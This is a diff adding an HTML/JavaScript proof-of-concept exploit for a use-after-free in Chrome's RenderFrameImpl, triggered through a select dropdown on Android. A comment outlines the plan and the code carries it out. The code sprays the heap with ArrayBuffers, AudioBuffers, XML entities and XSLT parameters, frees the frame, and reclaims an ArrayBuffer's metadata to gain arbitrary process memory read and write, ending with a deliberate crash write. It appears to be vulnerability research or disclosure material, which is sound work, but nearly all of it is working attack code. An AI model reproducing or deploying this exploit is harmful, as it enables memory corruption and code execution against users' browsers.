@@ -1,0 +1,211 @@
+<!-- 
+Exploit outline:
+1. Some spray and memory manipulations are done in order to make an WTF::Float32Array be allocated on predetermined address (for Nexus 5, Android 6.0.1 Build/MMB29Q, the address is 0x8cc24040). 
+2. Trigger the vulnerability to free the RenderFrameImpl object.
+3. Right after that, spray in the libc allocator in order to replace the freed object with an object containing the guessed address of WTF::Float32Array.
+4. When the event JS function (onTap) returns, and the native exection backtracks to content::RenderFrameImpl::OnSelectPopupMenuItems, the external_popup_menu_.reset() virtual method is invoked. Notice that:
+	a. We replaced external_popup_menu_ with the pointer to WTF::Float32Array.
+	b. The reset method of external_popup_menu_ is virtual method #4.
+	c. The virtual method #4 of WTF::Float32Array is WTF::ArrayBufferView::~ArrayBufferView, which basically frees the associated WTF::ArrayBuffer.
+Hence, the associated WTF::ArrayBuffer is freed.
+5. Now, we just replace the WTF::ArrayBuffer object (the metadata, not backing store) with our controlled data. Now, we have full Read & Write access to the whole process memory.
+-->
+
+<html>
+<head>
+	<title></title>
+</head>
+<body onload="onLoad()">
+	<div id="mydiv"></div>
+	<div id="del_me" >
+		<iframe id="frm" width="100%" height="100%" srcdoc='<html><body><select id="txt" style="zoom:10" selectedIndex="-1"><option>clickme 1</option><option id="opt">clickme 2</option></select></body></html>'></iframe>
+	</div>
+<script>
+
+	alert("Starting initialization, please wait.");
+
+	// Used for spray in libc allocator.
+	var xml_libc_allocations;
+	var xml_libc_allocations_results;
+
+	// Used for spray in FastMalloc.
+	var spray_audio_buffers;
+	var spray_1mb_array_buffer;
+
+	// Used for FastMalloc allocations.
+	var xslt_processor;
+	var xml;
+
+    // I Guess the first 2 bytes will be 0x8c 0xc2. 
+    // My shaping tries to match that on Nexus 5 chrome 70.
+    // On other platforms/chrome version, this magic address prefix may be different. 
+    var ADDR_PREFIX = 140;			// Nexus 5 Chromium 70	// 143 in UTF8 is 0x8cc2
+
+	function showDropdown(element) {
+	    var event;
+	    event = document.createEvent('MouseEvents');
+	    event.initMouseEvent('mousedown', true, true, window);
+	    element.dispatchEvent(event);
+	};
+
+	function simulateKeyEvent(obj, character) {
+		try {
+			var evt = document.createEvent("KeyboardEvent");
+			evt.initKeyboardEvent("keydown", true, true, window, "End", 0, 0, 0, 0, 0, character, character.charCodeAt(0));
+			var canceled = !obj.dispatchEvent(evt);
+			if(canceled) {
+				alert("canceled");
+			}
+		}
+		catch (e) {
+			alert(e);
+		}
+	}
+
+    // Prepare an XML for libc allocation.
+    function prepare_libc_allocations() {
+    	// Each attribute is an allocation in libc. We do many of them in order to make sure to catch RenderFrameImpl slot. 
+		xml_libc_allocations = ' att="&a;" att="&a;"';
+		for (var i = 0; i < 11; i++) {
+			xml_libc_allocations += xml_libc_allocations;
+		}	
+
+		// '@' = 0x40, so the guessed address of WTF::Float32Array is 0x8cc24040	
+		xml_libc_allocations = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE note [<!ELEMENT note (#PCDATA)><!ATTLIST note att ID "b"><!ENTITY a4 "@@&#' + ADDR_PREFIX + ';"><!ENTITY a20 "&a4;&a4;&a4;&a4;&a4;"><!ENTITY a100 "&a20;&a20;&a20;&a20;&a20;"><!ENTITY a500 "&a100;&a100;&a100;&a100;&a100;"><!ENTITY a "&a500;&a500;&a100;&#32;&#32;">]><note' +
+		xml_libc_allocations +'>/note>';
+    }
+
+    function prepare_fast_malloc_allocations() {
+		// Replace the float array with our controlled data.
+		xslt_processor = new XSLTProcessor();
+
+		// Template for the allocations. (contains the pointer for the fake DataHolder of the ArrayBuffer)
+		var template = 	String.fromCharCode(
+			0x58, 0x40, ADDR_PREFIX,
+			0x20, 0x20, 0x20, 0x20
+			);
+
+		// Allocate the template many times with an index.
+		for (var i = 0; i < 0x20000 * 3; i++) {
+			var data = ("0000" + i.toString(36)).slice(-4) + template;
+			xslt_processor.setParameter(null, data, data);
+		}
+
+		// Prepare the XSL processor.
+		var xmlResp = new DOMParser();
+		var xsl = xmlResp.parseFromString('<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform"/>', "text/xml");
+        xslt_processor.importStylesheet(xsl);
+
+		// Prepare an XML document.
+		var xmlResp = new DOMParser();
+		xml = xmlResp.parseFromString("<xml/>", "text/xml");
+    }
+
+	function onLoad() {
+		// Wait some time for startup initialization to complete.
+		setTimeout(onStart, 8000);
+	}
+
+    function onStart() {
+		try {
+			// Fragment partitionAlloc space.
+			spray_1mb_array_buffer = new Array(0x110);
+			for (var i = 0; i < 0x110; i++) {
+				spray_1mb_array_buffer[i] = new ArrayBuffer(0x100000);
+			}
+
+			// Allocate Float32Array out of the partitionAlloc space.
+			var audio_context = new AudioContext();
+			spray_audio_buffers = new Array(0xc000);
+			for (var i = 0; i < 0xc000; i++) {
+				spray_audio_buffers[i] = i;
+			}
+			for (var i = 0; i < 0xc000; i++) {
+				spray_audio_buffers[i] = audio_context.createBuffer(32, 1, 44100);
+			}
+
+			// Prepare allocations methods.
+			prepare_libc_allocations();
+			prepare_fast_malloc_allocations();
+
+			// Prepare the input tag.
+			var txt = frm.contentDocument.getElementById("txt");
+			txt.selectedIndex = -1;
+			txt.addEventListener("input", onTap);
+
+			alert("Initialization completed. You may click on the dropdown now.");
+			
+			// Show the popup to trigger the vulnerability.
+			// Note: On WebView (as well as on older chrome versions) this method will automatically
+			// 		 show the popup. otherwise, you should click on the combobox manually. 
+			showDropdown(txt);
+
+		}
+		catch (e) {
+			alert("Exception in onStart: " + e);
+		}
+	}
+
+	function onTap(e) { 
+		try {
+			parser = new DOMParser();
+			
+			// The use on RenderFrameImpl (aka the call to ~Float32Array) will be invoked only 
+			// after the current JS method will be returned. 
+			setTimeout(onFreed, 0);
+
+			// Free RenderFrameImpl.
+			frm.parentNode.removeChild(frm);
+			// RenderFrameImpl is freed now.
+
+			// Replace the content of RenderFrameImpl
+			xml_libc_allocations_results = parser.parseFromString(xml_libc_allocations, "application/xml");
+
+			// Now, we either succeed in case of correct address guess, or crash otherwise.
+		}
+		catch (e) {
+			alert("Exception in onTap " + e);
+		}
+	}
+
+	function onFreed() {
+		// This will free the painting object pointed by our dangling pointer.
+		mydiv.innerHTML = 'Success in few seconds.';
+		setTimeout(onFreed2, 100);
+	}
+
+	function onFreed2() {
+		try {
+			// Allocate in FastMalloc to replace the content of WTF::ArrayBuffer meta data (sizeof=0x10).
+			xslt_processor.transformToDocument(xml)
+
+			alert("About to search for the owned ArrayBuffer");
+
+			// Search our owned ArrayBuffer 
+			for (var i = 0; i < spray_audio_buffers.length; i++) {
+				for (var j = 0; j < 32; j++) {
+					var buffer = spray_audio_buffers[i].getChannelData(j).buffer;
+
+					// Only the owned ArrayBuffer has length other than 4.
+					if (buffer.byteLength != 4) {
+						alert("Success! Found the owned ArrayBuffer!");
+						alert("Object type is " + buffer);
+						alert("ArrayBuffer length is 0x" + buffer.byteLength.toString(16) + ". About to crash.");
+						var ta = new Uint32Array(buffer);
+
+						// Should crash on writing 0xdeadbeef to 0x10444444
+						ta[0x10444444 / 4] = 0xdeadbeef;
+					}
+				}
+			}
+
+			alert("End of search");
+
+		}
+		catch (e) {
+			alert("Exception in onFreed2 " + e);
+		}
+	}
+</script>
+</body>
+</html>
